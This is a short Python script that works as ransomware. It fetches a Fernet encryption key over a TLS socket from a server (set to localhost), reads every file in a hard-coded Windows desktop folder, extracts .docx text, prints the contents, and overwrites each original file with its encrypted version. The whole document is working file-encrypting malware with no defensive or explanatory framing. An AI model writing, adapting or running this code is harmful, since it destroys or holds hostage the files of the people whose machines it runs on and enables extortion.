import socket
import ssl
from cryptography.fernet import Fernet
import os
from docx import Document

ip= "127.0.0.1"
port = 55555

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ssl_socket =  ssl.wrap_socket(sock)
ssl_socket.connect((ip, port))
key = ssl_socket.recv(2048)
fernet = Fernet(key)

list = []
path = "C://Users//נביפור//OneDrive//שולחן העבודה//‏‏תיקיה חדשה"
dir_list = os.listdir(path)
print("Files and directories in '", path, "' :")
print(dir_list)
print(" ")
for file in dir_list:
        if ".docx" in file:
            doc = Document((path +"//" + file))
            text = "\n".join([paragraph.text for paragraph in doc.paragraphs])
            print(file + " content is :" + text + "\n")
            list.append(text)
        else:
            with open((path +"//" + file), "r", encoding="utf-8", errors="ignore") as f:
                txt = f.read()
                print(file + " content is :" + txt + "\n")
                list.append(txt)


encrypted_list = []
for data in list:
     encrypted = fernet.encrypt(data.encode()).decode()
     encrypted_list.append(encrypted)

i = 0
for file in dir_list:
     with open((path +"//" + file), "w") as f:
          f.write(encrypted_list[i])
          i = i+1


